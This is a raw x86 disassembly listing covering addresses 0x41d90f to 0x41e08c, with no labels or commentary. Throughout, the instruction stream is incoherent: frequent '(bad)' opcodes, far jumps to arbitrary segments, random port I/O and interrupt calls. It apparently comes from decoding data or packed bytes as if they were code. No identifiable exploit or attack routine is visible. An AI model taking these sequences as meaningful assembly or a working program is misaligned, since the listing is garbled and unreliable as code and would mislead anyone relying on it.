  41d90f:	in     eax,dx
  41d910:	push   eax
  41d911:	cmp    dl,BYTE PTR [ecx+0x3fd4333d]
  41d917:	sub    cl,dl
  41d919:	sti    
  41d91a:	mov    esp,0x5d611b8c
  41d91f:	xor    DWORD PTR [edi+0x7c7322f4],esp
  41d925:	push   0xefa43d08
  41d92a:	push   ecx
  41d92b:	imul   ebx,DWORD PTR [ecx+0x7358e4f6],0x3
  41d932:	ins    DWORD PTR es:[edi],dx
  41d933:	add    esp,ebp
  41d935:	mov    bl,0xb8
  41d937:	stc    
  41d938:	std    
  41d939:	xor    ch,dh
  41d93b:	xor    BYTE PTR [ebx+0x111e6a81],al
  41d941:	add    eax,DWORD PTR [edx+0x2ecdaac1]
  41d947:	jmp    0x41d945
  41d949:	(bad)  
  41d94a:	jmp    0x6da5:0x1804931c
  41d951:	mov    ecx,0xc1340dd9
  41d956:	lahf   
  41d957:	gs jp  0xb57bddc
  41d95e:	push   eax
  41d95f:	dec    eax
  41d960:	int    0x62
  41d962:	xor    bl,BYTE PTR [ebp+eiz*2+0x6e]
  41d966:	aas    
  41d967:	pop    ebx
  41d968:	jnp    0x41d9e5
  41d96a:	dec    esi
  41d96b:	sub    BYTE PTR [ecx+eiz*4],ch
  41d96e:	pop    es
  41d96f:	test   DWORD PTR [esi+0x47],edi
  41d972:	stos   DWORD PTR es:[edi],eax
  41d973:	or     ah,bl
  41d975:	or     al,0xa9
  41d977:	add    DWORD PTR [esi+0x688ed2dd],edi
  41d97d:	outs   dx,BYTE PTR ds:[esi]
  41d97e:	pop    ss
  41d97f:	lds    edx,FWORD PTR [ecx+edi*1+0x1f23d308]
  41d986:	fdiv   st,st(1)
  41d988:	sti    
  41d989:	sub    DWORD PTR [esp+edi*2-0x53],esp
  41d98d:	mov    DWORD PTR ds:0x75556ae8,0x5580e18e
  41d997:	jae    0x41d9ad
  41d999:	fs fprem1 
  41d99c:	add    al,0x2f
  41d99e:	fisub  WORD PTR [eax+0x63]
  41d9a1:	mov    al,ds:0x3542bfe0
  41d9a6:	fmulp  st(2),st
  41d9a8:	cs jno 0x41d9c9
  41d9ab:	loopne 0x41d9a1
  41d9ad:	sbb    ah,BYTE PTR [esi-0x17]
  41d9b0:	(bad)  
  41d9b1:	pop    ebx
  41d9b2:	rcl    BYTE PTR ds:0xb9e3bd94,0x9c
  41d9b9:	sti    
  41d9ba:	lods   eax,DWORD PTR ds:[esi]
  41d9bb:	cld    
  41d9bc:	mov    ah,0xfe
  41d9be:	aam    0x4b
  41d9c0:	into   
  41d9c1:	sbb    al,BYTE PTR [ecx+ebx*4]
  41d9c4:	popf   
  41d9c5:	push   eax
  41d9c6:	mov    al,ds:0x9b6cacc7
  41d9cb:	jmp    0xfe9e:0xff267288
  41d9d2:	jno    0x41d993
  41d9d4:	xor    cl,BYTE PTR [edi+0x6a]
  41d9d7:	mov    esi,0x864cb2f3
  41d9dc:	daa    
  41d9dd:	inc    ebp
  41d9de:	xlat   BYTE PTR ds:[ebx]
  41d9df:	pop    es
  41d9e0:	mov    ch,0xad
  41d9e2:	int    0xe2
  41d9e4:	(bad)  
  41d9e5:	aaa    
  41d9e6:	add    eax,ebx
  41d9e8:	mov    dl,0x99
  41d9ea:	mov    ds:0x86025290,eax
  41d9ef:	into   
  41d9f0:	jo     0x41d9f2
  41d9f2:	inc    ebp
  41d9f3:	adc    eax,DWORD PTR [esi+0x1407f7f6]
  41d9f9:	inc    esp
  41d9fa:	add    edx,esi
  41d9fc:	push   edi
  41d9fd:	popa   
  41d9fe:	sub    esp,edx
  41da00:	sbb    dh,BYTE PTR [ebx+ebx*4]
  41da03:	(bad)  
  41da04:	push   eax
  41da05:	mul    DWORD PTR [edx+edx*2+0x4ad984b5]
  41da0c:	mov    edx,0x6d62cc63
  41da11:	aas    
  41da12:	xchg   ecx,eax
  41da13:	xchg   edi,eax
  41da14:	pop    ss
  41da15:	cmp    al,ch
  41da17:	aaa    
  41da18:	fs ret 
  41da1a:	mov    esp,0x6ad51571
  41da1f:	repz cmp BYTE PTR [edx+0x28f4dcca],bh
  41da26:	in     eax,0x68
  41da28:	mov    al,BYTE PTR [edx+0x56718254]
  41da2e:	jmp    0x4820:0x37459fc5
  41da35:	fld    DWORD PTR [edi-0x4d]
  41da38:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da3a:	pusha  
  41da3b:	push   ss
  41da3c:	mov    al,ds:0x28d4116e
  41da41:	ror    DWORD PTR [eax+0x57b05a3b],cl
  41da47:	sbb    ah,bh
  41da49:	ins    BYTE PTR es:[edi],dx
  41da4a:	ret    0xc0e4
  41da4d:	outs   dx,DWORD PTR ds:[esi]
  41da4e:	push   0x7d
  41da50:	sar    cl,0x51
  41da53:	lock jbe 0x41dacc
  41da56:	aad    0x88
  41da58:	cli    
  41da59:	fistp  WORD PTR [ecx+0x26]
  41da5c:	mov    WORD PTR [edx],fs
  41da5e:	push   ebx
  41da5f:	xchg   BYTE PTR [esp-0x4d],ah
  41da63:	cmp    eax,0x102c9d9d
  41da68:	or     al,0xce
  41da6a:	cdq    
  41da6b:	add    DWORD PTR [ecx],ebp
  41da6d:	mov    ecx,0x37e42c98
  41da72:	test   al,0xe8
  41da74:	sbb    DWORD PTR [ecx+0x38],0xffffffe9
  41da78:	mov    ds:0x7e9ec9d0,eax
  41da7d:	ror    DWORD PTR [esi-0x4e45c39a],1
  41da83:	xchg   edx,eax
  41da84:	pusha  
  41da85:	shl    BYTE PTR [eax],1
  41da87:	pusha  
  41da88:	ja     0x41da60
  41da8a:	jo     0x41da48
  41da8c:	xchg   ebp,eax
  41da8d:	xchg   ebx,eax
  41da8e:	mov    edi,0x147635a8
  41da93:	inc    esp
  41da94:	sti    
  41da95:	jnp    0x41da42
  41da97:	or     DWORD PTR [esi-0x7d5491d3],esi
  41da9d:	je     0x41da53
  41da9f:	aas    
  41daa0:	stc    
  41daa1:	ret    
  41daa2:	lock pop edi
  41daa4:	ins    DWORD PTR es:[edi],dx
  41daa5:	push   ebx
  41daa6:	xor    ebx,edx
  41daa8:	jno    0x41dafb
  41daaa:	adc    dh,dl
  41daac:	xchg   DWORD PTR [ecx+esi*4],edx
  41daaf:	or     eax,0x28e3b4ef
  41dab4:	jnp    0x41dab9
  41dab6:	push   ebx
  41dab7:	mov    cs,WORD PTR [ebx+0x112b1940]
  41dabd:	jno    0x41dad0
  41dabf:	les    ecx,FWORD PTR [edi]
  41dac1:	imul   ebx,DWORD PTR [ecx-0x7],0xffffffa2
  41dac5:	pop    eax
  41dac6:	pop    edx
  41dac7:	cmp    eax,0xd1db6f26
  41dacc:	xchg   edx,eax
  41dacd:	mov    ebp,0x30c89a97
  41dad2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dad3:	jns    0x41dab3
  41dad5:	sub    BYTE PTR [ecx],dh
  41dad7:	lods   eax,DWORD PTR ds:[esi]
  41dad8:	add    esp,0xed4bb5ec
  41dade:	pop    ds
  41dadf:	xor    ebx,DWORD PTR [ebp+eiz*4+0x6d950497]
  41dae6:	mov    ebx,0xac3f099a
  41daeb:	xchg   bp,ax
  41daed:	jns    0x41dac6
  41daef:	ins    DWORD PTR es:[edi],dx
  41daf0:	cmp    al,0xd3
  41daf2:	call   0xce381e17
  41daf7:	xchg   BYTE PTR [edi+0x765a69ff],ch
  41dafd:	sti    
  41dafe:	out    0x8c,eax
  41db00:	push   cs
  41db01:	inc    ebp
  41db02:	jb     0x41daef
  41db04:	js     0x41dab4
  41db06:	nop
  41db07:	cmp    DWORD PTR [edi],ecx
  41db09:	mov    cl,0x92
  41db0b:	fidiv  DWORD PTR [ebx+ecx*1]
  41db0e:	and    DWORD PTR [ecx+0x34],0xf044fed4
  41db15:	mov    ebx,0xbb88d340
  41db1a:	adc    edx,DWORD PTR [eax+0x7f27ade3]
  41db20:	xor    eax,0x1ccf05f4
  41db25:	mov    al,ds:0x76413fb2
  41db2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db2b:	mov    DWORD PTR [edi+0x1da8d565],esp
  41db31:	push   edi
  41db32:	sbb    BYTE PTR [ebp-0x22],ch
  41db35:	in     eax,dx
  41db36:	inc    ebx
  41db37:	and    ch,0x45
  41db3a:	cmc    
  41db3b:	jno    0x41dbb5
  41db3d:	ins    BYTE PTR es:[edi],dx
  41db3e:	cmp    eax,0x9c16caa2
  41db43:	es jg  0x41db9b
  41db46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db47:	jnp    0x41db81
  41db49:	call   0x2740:0xb9de9ac3
  41db50:	push   es
  41db51:	sub    eax,0x1789c981
  41db56:	jmp    0xe8fc46e0
  41db5b:	fstp   QWORD PTR [ebx-0x6b27e12c]
  41db61:	jmp    0x78f3:0xdbd81702
  41db68:	adc    edi,DWORD PTR [edi-0x6c]
  41db6b:	push   ebx
  41db6c:	xchg   edi,eax
  41db6d:	adc    eax,0xecf76eff
  41db72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db73:	ja     0x41db24
  41db75:	fcmovu st,st(0)
  41db77:	jbe    0x41db4e
  41db79:	fcom   DWORD PTR [edi+0x414db23a]
  41db7f:	jmp    0x41db7c
  41db81:	mov    ds:0xb09fc4cc,eax
  41db86:	mov    ds:0xad4efab8,al
  41db8b:	mov    esp,0x4bcb80ef
  41db90:	mov    ds:0x36a2ccfe,al
  41db95:	jne    0x41dba8
  41db97:	mov    eax,0x84b80d11
  41db9c:	pop    ss
  41db9d:	or     al,0x49
  41db9f:	inc    ebx
  41dba0:	pop    edi
  41dba1:	pushf  
  41dba2:	xor    dh,cl
  41dba4:	(bad)  
  41dba6:	mov    bl,0x3a
  41dba8:	fild   DWORD PTR [esp+eax*2-0x2e]
  41dbac:	inc    ecx
  41dbad:	int    0x2d
  41dbaf:	stos   BYTE PTR es:[edi],al
  41dbb0:	pop    edx
  41dbb1:	call   0x193e7611
  41dbb6:	cmp    eax,ebp
  41dbb8:	ror    BYTE PTR [ecx+ebx*2-0x62ac9b92],1
  41dbbf:	push   0xffffffd7
  41dbc1:	nop
  41dbc2:	popa   
  41dbc3:	retf   0x6b40
  41dbc6:	das    
  41dbc7:	sub    BYTE PTR [eax],0xd9
  41dbca:	and    eax,0x510659d3
  41dbcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dbd0:	xchg   DWORD PTR [edx+0x50b11e10],ebx
  41dbd6:	jae    0x41dc36
  41dbd8:	mov    esp,0x7fcfca8
  41dbdd:	jle    0x41db72
  41dbdf:	sub    DWORD PTR [edi+eiz*1-0x5d],ebx
  41dbe3:	push   ebp
  41dbe4:	mov    bl,0x59
  41dbe6:	(bad)  
  41dbe8:	imul   ebp,DWORD PTR [ebx+0x10],0x42
  41dbec:	ss es ret 
  41dbef:	mov    ch,0xb6
  41dbf1:	loop   0x41dc50
  41dbf3:	dec    ecx
  41dbf4:	inc    ebp
  41dbf5:	jae    0x41dbd4
  41dbf7:	jmp    0x41dc3f
  41dbf9:	cmp    edi,DWORD PTR [ebp+ebp*2+0x59]
  41dbfd:	cmp    al,0x91
  41dbff:	cdq    
  41dc00:	call   0x4a33:0xfcab24dd
  41dc07:	ins    BYTE PTR es:[edi],dx
  41dc08:	xor    BYTE PTR [edi],cl
  41dc0a:	mov    ds:0x870b78b6,eax
  41dc0f:	push   edi
  41dc10:	test   BYTE PTR [edi],0x98
  41dc13:	dec    ebx
  41dc14:	popa   
  41dc15:	lock (bad) 
  41dc19:	mov    al,ds:0x693f595c
  41dc1e:	and    al,0xb3
  41dc20:	scas   eax,DWORD PTR es:[edi]
  41dc21:	mov    bl,0xe7
  41dc23:	out    0x71,eax
  41dc25:	dec    esp
  41dc26:	add    DWORD PTR [eax+0x42],eax
  41dc29:	repz ret 
  41dc2b:	xor    DWORD PTR ds:0x63ebfa9e,esp
  41dc31:	and    DWORD PTR [eax],ecx
  41dc33:	stc    
  41dc34:	ss jnp 0x41dc04
  41dc37:	mul    BYTE PTR [edx-0x41]
  41dc3a:	popa   
  41dc3b:	retf   0x49d9
  41dc3e:	lahf   
  41dc3f:	cmp    eax,0x5ce88572
  41dc44:	fst    QWORD PTR [edx+0x46]
  41dc47:	add    BYTE PTR [esi+0x30ef70ff],bl
  41dc4d:	int    0x66
  41dc4f:	jb     0x41dbf6
  41dc51:	add    eax,0x4008bb75
  41dc56:	sti    
  41dc57:	dec    ebx
  41dc58:	aad    0x6
  41dc5a:	cmc    
  41dc5b:	inc    esp
  41dc5c:	push   esp
  41dc5d:	cmc    
  41dc5e:	jnp    0x41dc32
  41dc60:	mov    esp,0x2a2b3d4c
  41dc65:	test   eax,0xd97a597d
  41dc6a:	jge    0x41dc59
  41dc6c:	pop    esi
  41dc6d:	jge    0x41dcd5
  41dc6f:	cmp    edx,DWORD PTR [edx]
  41dc71:	outs   dx,DWORD PTR ds:[esi]
  41dc72:	or     DWORD PTR [esi-0x72],ebp
  41dc75:	push   ss
  41dc76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc77:	or     DWORD PTR [ecx+0x196df5fc],esp
  41dc7d:	dec    esp
  41dc7e:	outs   dx,DWORD PTR ds:[esi]
  41dc7f:	add    edx,DWORD PTR [edx-0x27]
  41dc82:	dec    ebp
  41dc83:	jbe    0x41dcc5
  41dc85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc86:	xor    esp,DWORD PTR ds:0x42ec401c
  41dc8c:	stc    
  41dc8d:	inc    edx
  41dc8e:	fidivr WORD PTR [ebx-0x4a54269e]
  41dc94:	test   al,0x59
  41dc96:	pop    esi
  41dc97:	mov    edi,0xc30cb428
  41dc9c:	cld    
  41dc9d:	xchg   ebp,eax
  41dc9e:	(bad)  
  41dc9f:	popa   
  41dca0:	mov    ds:0xc79601d2,eax
  41dca5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dca6:	leave  
  41dca7:	xor    DWORD PTR [eax-0xb],edi
  41dcaa:	adc    DWORD PTR [eax-0x10],eax
  41dcad:	sahf   
  41dcae:	lea    ecx,[ebx+0x39]
  41dcb1:	push   eax
  41dcb2:	cmp    BYTE PTR [eax],cl
  41dcb4:	(bad)  
  41dcb6:	pushf  
  41dcb7:	dec    ebx
  41dcb8:	xchg   edx,eax
  41dcb9:	pop    esi
  41dcba:	cld    
  41dcbb:	cmp    DWORD PTR [edx-0x507d201c],eax
  41dcc1:	jmp    0xef7:0x5656a02c
  41dcc8:	and    DWORD PTR [edx],0xeb12dffc
  41dcce:	and    al,0x7
  41dcd0:	jne    0x41dcd8
  41dcd2:	xchg   esi,eax
  41dcd3:	out    0xfa,eax
  41dcd5:	dec    ebx
  41dcd6:	fcomi  st,st(0)
  41dcd8:	xor    dl,BYTE PTR ds:[eax+0x260c0cee]
  41dcdf:	call   0xc5067dda
  41dce4:	sbb    eax,0xa8e0efdf
  41dce9:	mov    al,0x88
  41dceb:	mov    dl,0xbb
  41dced:	xchg   esp,eax
  41dcee:	shl    BYTE PTR [ecx-0x55d004f8],cl
  41dcf4:	or     al,ah
  41dcf6:	push   eax
  41dcf7:	mov    edx,0x327e9aa7
  41dcfc:	dec    ebp
  41dcfd:	pop    edx
  41dcfe:	(bad)  
  41dcff:	push   ebx
  41dd00:	rcl    DWORD PTR [eax-0x41386f5c],1
  41dd06:	(bad)  
  41dd07:	or     DWORD PTR [esi+0x17],esi
  41dd0a:	test   BYTE PTR [ebp-0x7c],0x48
  41dd0e:	pop    esi
  41dd0f:	mov    WORD PTR [ebx],cs
  41dd11:	hlt    
  41dd12:	or     DWORD PTR [ecx+0x72],ebx
  41dd15:	mov    ah,0xb3
  41dd17:	ss pop eax
  41dd19:	xchg   ebx,eax
  41dd1a:	add    dl,BYTE PTR [edx+0x65a57e9e]
  41dd20:	add    DWORD PTR [ebx+ecx*4-0x4a],edx
  41dd24:	adc    eax,DWORD PTR [esi-0x37291952]
  41dd2a:	mov    DWORD PTR [esi+ebx*2],esi
  41dd2d:	adc    eax,0x550bac87
  41dd32:	xchg   ecx,eax
  41dd33:	out    dx,eax
  41dd34:	jns    0x41dce0
  41dd36:	jbe    0x41dd0a
  41dd38:	push   ds
  41dd39:	mov    eax,0xb0e7e7ed
  41dd3e:	mov    ds:0xcbd8a660,eax
  41dd43:	jmp    0x5332c61e
  41dd48:	stos   BYTE PTR es:[edi],al
  41dd49:	push   ss
  41dd4a:	sbb    ecx,DWORD PTR [esi-0x59]
  41dd4d:	sub    al,ch
  41dd4f:	cld    
  41dd50:	dec    ebx
  41dd51:	js     0x41dd20
  41dd53:	mov    ch,0x8
  41dd55:	je     0x41dd9a
  41dd57:	jg     0x41dcdd
  41dd59:	repnz ds push ss
  41dd5c:	popf   
  41dd5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd5e:	sbb    BYTE PTR [ebx+0x14],al
  41dd61:	shr    edi,0xa7
  41dd64:	or     al,0x8b
  41dd66:	stos   DWORD PTR es:[edi],eax
  41dd67:	xchg   ebx,eax
  41dd68:	inc    esp
  41dd69:	cmp    BYTE PTR [ecx],dl
  41dd6b:	sbb    BYTE PTR [eax],ch
  41dd6d:	mov    bh,0xf3
  41dd6f:	lods   eax,DWORD PTR ds:[esi]
  41dd70:	jns    0x41dcf9
  41dd72:	push   0x264e99de
  41dd77:	imul   eax,DWORD PTR [eax-0x411329f1],0xfa618e50
  41dd81:	sub    esp,edi
  41dd83:	test   al,0xda
  41dd85:	loop   0x41dd60
  41dd87:	and    edx,DWORD PTR [ebx]
  41dd89:	xchg   edx,eax
  41dd8a:	test   BYTE PTR [ecx],dh
  41dd8c:	add    BYTE PTR ds:0x284ea343,ch
  41dd92:	inc    esp
  41dd93:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd95:	jg     0x41dd8e
  41dd97:	scas   eax,DWORD PTR es:[edi]
  41dd98:	push   esi
  41dd99:	mov    ecx,0xe7bc43bc
  41dd9e:	add    al,0x78
  41dda0:	or     al,0x9b
  41dda2:	inc    esp
  41dda3:	sub    BYTE PTR [ebx-0x67],0x41
  41dda7:	out    0x1b,eax
  41dda9:	fwait
  41ddaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ddab:	lods   eax,DWORD PTR ds:[esi]
  41ddac:	or     DWORD PTR [ecx+edx*1],esp
  41ddaf:	push   es
  41ddb0:	aam    0xb8
  41ddb2:	xchg   ebx,eax
  41ddb3:	leave  
  41ddb4:	jmp    0xe6e0:0x673f4102
  41ddbb:	loope  0x41ddf2
  41ddbd:	call   0x803c:0xd6a888aa
  41ddc4:	sbb    BYTE PTR [ebp+edx*8-0x4],dh
  41ddc8:	add    DWORD PTR [esi+0x6d81000e],edx
  41ddce:	arpl   WORD PTR [edi+0x58],ax
  41ddd1:	add    bl,BYTE PTR [ecx+ebx*1]
  41ddd4:	(bad)  
  41ddd5:	xor    bh,BYTE PTR [edx-0x25f62e8e]
  41dddb:	pop    ss
  41dddc:	dec    esp
  41dddd:	imul   eax,DWORD PTR [edx],0xffffffa6
  41dde0:	stc    
  41dde1:	rdpmc  
  41dde3:	fstp   TBYTE PTR [edx]
  41dde5:	shr    BYTE PTR [ecx+esi*4-0x51],cl
  41dde9:	fistp  WORD PTR [edi]
  41ddeb:	in     eax,0x9c
  41dded:	enter  0xa6c,0x97
  41ddf1:	pop    ebx
  41ddf2:	sub    DWORD PTR [ebx+0x35667736],edi
  41ddf8:	dec    esi
  41ddf9:	mov    ecx,0x9eccec3e
  41ddfe:	mov    bl,BYTE PTR [edx+0x662c6c0f]
  41de04:	jno    0x41ddc1
  41de06:	or     al,0x38
  41de08:	pop    ecx
  41de09:	int    0x1f
  41de0b:	mov    eax,0x9366d30b
  41de10:	ins    DWORD PTR es:[edi],dx
  41de11:	(bad)  
  41de13:	popf   
  41de14:	js     0x41dd9d
  41de16:	push   ebx
  41de17:	mov    WORD PTR [esi-0x3b],ax
  41de1b:	or     BYTE PTR ds:0x3f91f7cc,ch
  41de21:	out    dx,al
  41de22:	scas   al,BYTE PTR es:[edi]
  41de23:	arpl   WORD PTR [esi],dx
  41de25:	cld    
  41de26:	mov    cl,0x8c
  41de28:	xchg   edx,eax
  41de29:	mov    dh,0x26
  41de2b:	sbb    ebx,DWORD PTR [edi]
  41de2d:	je     0x41ddd4
  41de2f:	jge    0x41de89
  41de31:	sbb    edx,ebp
  41de33:	push   0xffffffbb
  41de35:	xchg   esi,eax
  41de36:	dec    edi
  41de37:	std    
  41de38:	(bad)  
  41de39:	jp     0x41de46
  41de3b:	sbb    eax,0x4912ded7
  41de40:	pop    eax
  41de41:	xor    DWORD PTR [ebx+ebx*4+0xb1503e2],ebx
  41de48:	add    al,0xef
  41de4a:	sub    cl,ch
  41de4c:	mov    al,0xb2
  41de4e:	adc    BYTE PTR [ebx-0x2adf856f],bh
  41de54:	xor    esp,DWORD PTR [edi]
  41de56:	xor    DWORD PTR [edx+0xd],ebp
  41de59:	daa    
  41de5a:	call   0x505fedd0
  41de5f:	out    dx,eax
  41de60:	loope  0x41ddff
  41de62:	loop   0x41deac
  41de64:	cs mov ecx,0x665196bd
  41de6a:	xor    BYTE PTR [ebp-0x5c],0xfb
  41de6e:	dec    ebp
  41de6f:	pop    es
  41de70:	dec    esi
  41de71:	fwait
  41de72:	and    eax,0x364a541c
  41de77:	dec    ebp
  41de78:	sbb    eax,0x63361f13
  41de7d:	mov    edx,0x6c01c6bf
  41de82:	jecxz  0x41def5
  41de84:	(bad)  
  41de85:	xchg   BYTE PTR [eax],dh
  41de87:	test   BYTE PTR [ebx],ah
  41de89:	and    al,BYTE PTR [eax-0x62cc13a0]
  41de8f:	and    BYTE PTR [eax+0x51],0x10
  41de93:	ins    DWORD PTR es:[edi],dx
  41de94:	daa    
  41de95:	iret   
  41de96:	pop    DWORD PTR [edi+0x4c]
  41de99:	adc    ecx,esp
  41de9b:	xor    BYTE PTR [esi-0x4],0x13
  41de9f:	in     al,dx
  41dea0:	xor    eax,0xde19ae80
  41dea5:	or     al,0x6e
  41dea7:	mov    ebp,0xe55c285e
  41deac:	pop    ds
  41dead:	xchg   BYTE PTR [esi-0x6e00e3ce],bh
  41deb3:	outs   dx,BYTE PTR ds:[esi]
  41deb4:	mov    cl,0x97
  41deb6:	xlat   BYTE PTR ds:[ebx]
  41deb7:	sub    DWORD PTR [edi],esi
  41deb9:	retf   
  41deba:	outs   dx,DWORD PTR ds:[esi]
  41debb:	pop    esp
  41debc:	cld    
  41debd:	arpl   WORD PTR [ecx-0x4a3640f0],bp
  41dec3:	stos   DWORD PTR es:[edi],eax
  41dec4:	aas    
  41dec5:	ins    DWORD PTR es:[edi],dx
  41dec6:	sub    ebp,DWORD PTR ds:0xe24fa77
  41decc:	nop
  41decd:	mov    ecx,DWORD PTR [edi-0x70b0e29b]
  41ded3:	out    0x8b,eax
  41ded5:	sbb    BYTE PTR [eax-0x74],0xe8
  41ded9:	in     eax,dx
  41deda:	dec    esi
  41dedb:	movd   esp,mm2
  41dede:	(bad)
  41dee1:	xor    esi,ebp
  41dee3:	pop    edx
  41dee4:	rcl    edx,cl
  41dee6:	mov    ebp,0xe9824d2b
  41deeb:	repnz fisub WORD PTR [ecx-0x19]
  41deef:	mov    eax,0x8c082df2
  41def4:	pushf  
  41def5:	pusha  
  41def6:	mov    esp,0x9518f0af
  41defb:	bound  edx,QWORD PTR [esi+0x1e]
  41defe:	stc    
  41deff:	cmp    dl,cl
  41df01:	pop    es
  41df02:	dec    ebx
  41df03:	xor    ecx,ebx
  41df05:	test   DWORD PTR [esi-0x33],ebp
  41df08:	loope  0x41dec9
  41df0a:	pop    ds
  41df0b:	xchg   ebx,eax
  41df0c:	mov    ds:0x976cf581,al
  41df11:	cmp    eax,edi
  41df13:	(bad)
  41df16:	or     BYTE PTR [eax],0x15
  41df19:	mov    eax,0x10240072
  41df1e:	outs   dx,DWORD PTR ds:[esi]
  41df1f:	or     al,0xc3
  41df21:	ins    DWORD PTR es:[edi],dx
  41df22:	sub    DWORD PTR [edx+0x1a83cb8b],esi
  41df28:	scas   al,BYTE PTR es:[edi]
  41df29:	out    0xfd,al
  41df2b:	xor    al,0xac
  41df2d:	sbb    BYTE PTR ds:0xcb7a049b,bh
  41df33:	shl    BYTE PTR [ebx],cl
  41df35:	push   0x2a
  41df37:	adc    ch,dl
  41df39:	mov    ecx,DWORD PTR [ecx-0x16b37cd]
  41df3f:	dec    ebp
  41df40:	cli    
  41df41:	inc    esp
  41df42:	and    BYTE PTR [edx],dl
  41df44:	sbb    eax,esi
  41df46:	nop
  41df47:	cwde   
  41df48:	xor    DWORD PTR ds:0x7d1fd830,esp
  41df4e:	push   ds
  41df4f:	sub    eax,DWORD PTR [edi-0x2950e1b1]
  41df55:	jmp    0xcd16:0x4d98fa38
  41df5c:	test   eax,0x5435bc41
  41df61:	jb     0x41df5c
  41df63:	jp     0x41df08
  41df65:	mov    edx,0xccfb2fa2
  41df6a:	scas   eax,DWORD PTR es:[edi]
  41df6b:	clc    
  41df6c:	xor    al,0xb
  41df6e:	cmp    BYTE PTR [ebx+0x2f],bh
  41df71:	xchg   ecx,eax
  41df72:	gs test eax,0x764b899
  41df78:	fwait
  41df79:	jl     0x41dfd5
  41df7b:	(bad)  
  41df7c:	call   0xee68:0xab207234
  41df83:	mov    ebp,0x9ff89f0c
  41df88:	xchg   edi,eax
  41df89:	lds    edx,FWORD PTR [edx+0x7d8764aa]
  41df8f:	out    dx,eax
  41df90:	repnz pop ss
  41df92:	imul   BYTE PTR [esi]
  41df94:	(bad)  
  41df96:	pop    ecx
  41df97:	mov    ch,0x51
  41df99:	cmp    eax,0x480b8771
  41df9e:	out    dx,al
  41df9f:	jns    0x41dfd7
  41dfa1:	push   0x404e1471
  41dfa6:	push   ebx
  41dfa7:	jmp    0xbcb90fb
  41dfac:	aam    0xc3
  41dfae:	shl    edi,cl
  41dfb0:	icebp  
  41dfb1:	inc    ebx
  41dfb2:	mov    eax,0x6a170061
  41dfb7:	mov    ebp,0xe3859c69
  41dfbc:	sbb    ecx,esi
  41dfbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dfbf:	lock retf 
  41dfc1:	or     DWORD PTR [edx+eax*8],edx
  41dfc4:	jne    0x41df77
  41dfc6:	lds    ebx,FWORD PTR ds:0x7dcbec57
  41dfcc:	mov    ch,0x3c
  41dfce:	(bad)  
  41dfcf:	mov    DWORD PTR [ebx-0x79b55fc3],0xfac06fa4
  41dfd9:	pop    edi
  41dfda:	(bad)  
  41dfdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dfdc:	pop    edi
  41dfdd:	dec    ecx
  41dfde:	inc    esp
  41dfdf:	rcr    DWORD PTR [ecx-0x7f],cl
  41dfe2:	inc    edx
  41dfe3:	add    al,0xe4
  41dfe5:	inc    eax
  41dfe6:	retf   0x75de
  41dfe9:	push   es
  41dfea:	sub    eax,0x8cf8d54
  41dfef:	xlat   BYTE PTR ds:[ebx]
  41dff0:	inc    ecx
  41dff1:	lods   al,BYTE PTR ds:[esi]
  41dff2:	mov    edi,esp
  41dff4:	mov    edx,0xa39d55e
  41dff9:	add    al,0x3e
  41dffb:	push   ebx
  41dffc:	dec    ebp
  41dffd:	ins    DWORD PTR es:[edi],dx
  41dffe:	adc    ebp,DWORD PTR ds:0x802614ac
  41e004:	inc    edx
  41e005:	add    BYTE PTR [edx+0x5e],0x3
  41e009:	vcvtpd2ps xmm7,XMMWORD PTR [ebx]
  41e00d:	shl    DWORD PTR [esi],cl
  41e00f:	or     al,0x1
  41e011:	fld    DWORD PTR [edx]
  41e013:	ja     0x41e01b
  41e015:	pop    edx
  41e016:	jns    0x41e038
  41e018:	pop    ebp
  41e019:	popa   
  41e01a:	sar    cl,1
  41e01c:	jmp    0xa294:0x4d397fe0
  41e023:	dec    edx
  41e024:	repz fidiv DWORD PTR [ebx-0x318bccc2]
  41e02b:	dec    edi
  41e02c:	fnclex 
  41e02e:	scas   al,BYTE PTR es:[edi]
  41e02f:	ins    DWORD PTR es:[edi],dx
  41e030:	add    al,0xfd
  41e032:	mov    ds:0xcc718c4d,eax
  41e037:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e038:	xor    al,0x71
  41e03a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e03b:	stos   BYTE PTR es:[edi],al
  41e03c:	jmp    0xcef8:0x8efd3bfb
  41e043:	jmp    0x1fe0:0x431da347
  41e04a:	repnz push esi
  41e04c:	outs   dx,BYTE PTR ds:[esi]
  41e04d:	mov    esp,0x4306620b
  41e052:	mov    BYTE PTR [ecx],ch
  41e054:	rcl    BYTE PTR [eax-0x5b],1
  41e057:	jmp    0x41e0a1
  41e059:	sub    ebp,edx
  41e05b:	cli    
  41e05c:	lods   al,BYTE PTR ds:[esi]
  41e05d:	(bad)  [esi]
  41e05f:	popa   
  41e060:	lods   eax,DWORD PTR ds:[esi]
  41e061:	test   DWORD PTR [edx+0x57f288e],esi
  41e067:	or     ebx,DWORD PTR [edi]
  41e069:	fstp   DWORD PTR [ebx]
  41e06b:	pop    ds
  41e06c:	and    al,0x18
  41e06e:	dec    esi
  41e06f:	les    edx,FWORD PTR [ecx-0x3]
  41e072:	imul   ebp,ebx,0xffffffba
  41e075:	in     al,0x82
  41e077:	int3   
  41e078:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e079:	into   
  41e07a:	xor    DWORD PTR [edx-0x60],esp
  41e07d:	push   DWORD PTR ds:0xa9da9c6e
  41e083:	cmc    
  41e084:	iret   
  41e085:	idiv   dl
  41e087:	mov    esp,0x9c6826ae
  41e08c:	inc    esp
